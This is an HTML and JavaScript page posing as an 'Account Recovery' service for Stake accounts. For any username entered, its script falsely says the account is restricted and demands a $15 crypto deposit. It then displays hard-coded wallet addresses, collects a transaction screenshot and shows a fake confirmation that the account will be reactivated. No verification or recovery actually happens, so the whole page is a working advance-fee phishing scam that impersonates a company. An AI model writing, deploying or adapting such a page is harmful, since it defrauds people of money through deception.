<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ReStake Access</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
      color: white;
      padding: 20px;
      max-width: 600px;
      margin: auto;
    }
    h1 {
      text-align: center;
      margin-bottom: 30px;
    }
    .form-group {
      margin-bottom: 15px;
    }
    label {
      display: block;
      margin-bottom: 5px;
    }
    input[type="text"], select, input[type="file"] {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 5px;
    }
    button {
      padding: 10px 15px;
      background-color: #00c853;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    #verifyMessage, #addressDisplay, #confirmationMsg, #submitMessage {
      margin-top: 10px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <h1>Account Recovery</h1>

  <div class="form-group">
    <label for="username">Enter Username</label>
    <input type="text" id="username">
    <button onclick="verifyUser()">Verify</button>
    <div id="verifyMessage"></div>
  </div>

  <div class="form-group">
    <label for="cryptoSelect">Select Crypto & Network</label>
    <select id="cryptoSelect" onchange="updateAddress()">
      <option value="">--Select--</option>
      <option value="USDT_TRC20">USDT - TRC20</option>
      <option value="USDT_BSC">USDT - BSC</option>
      <option value="BTC_BSC">BTC - BSC</option>
      <option value="TRX_TRC20">TRX - TRC20</option>
      <option value="TRX_BSC">TRX - BSC</option>
      <option value="ETH_BSC">Ethereum - BSC</option>
    </select>
    <div id="addressDisplay"></div>
    <button onclick="copyAddress()">Copy Address</button>
  </div>

  <div class="form-group">
    <label for="screenshot">Upload Transaction Screenshot</label>
    <input type="file" id="screenshot">
  </div>

  <div class="form-group">
    <button onclick="submitForm()">Submit</button>
    <div id="submitMessage"></div>
  </div>

  <script>
    const cryptoAddresses = {
      USDT_TRC20: "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
      USDT_BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c",
      BTC_BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c",
      TRX_TRC20: "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
      TRX_BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c",
      ETH_BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
    };

    function verifyUser() {
      const username = document.getElementById("username").value.trim();
      const verifyMsg = document.getElementById("verifyMessage");
      verifyMsg.innerHTML = "<em>Verifying...</em>";

      setTimeout(() => {
        if (username) {
          verifyMsg.innerHTML = "<strong>Your Stake account is in withdraw-only mode or has restrictions. To resolve this, a minimum deposit of $15 is required. The deposited amount will be added to your Stake account automatically.</strong>";
        } else {
          verifyMsg.innerHTML = "Please enter a valid username.";
        }
      }, 1500);
    }

    function updateAddress() {
      const selected = document.getElementById("cryptoSelect").value;
      const addressBox = document.getElementById("addressDisplay");
      if (selected && cryptoAddresses[selected]) {
        addressBox.innerText = "Address: " + cryptoAddresses[selected];
      } else {
        addressBox.innerText = "";
      }
    }

    function copyAddress() {
      const selected = document.getElementById("cryptoSelect").value;
      const address = cryptoAddresses[selected];
      if (address) {
        navigator.clipboard.writeText(address).then(() => {
          alert("Address copied to clipboard!");
        });
      } else {
        alert("Please select a crypto/network first.");
      }
    }

    function submitForm() {
      const username = document.getElementById("username").value.trim();
      const crypto = document.getElementById("cryptoSelect").value;
      const screenshot = document.getElementById("screenshot").files.length;

      if (username && crypto && screenshot) {
        document.getElementById("submitMessage").innerHTML = "<strong>Your account recovery request has been received by StakePass. Your account will be fully active within 24 - 72 hours.</strong>";
      } else {
        document.getElementById("submitMessage").innerText = "Please fill all details before submitting.";
      }
    }
  </script>
</body>
</html>
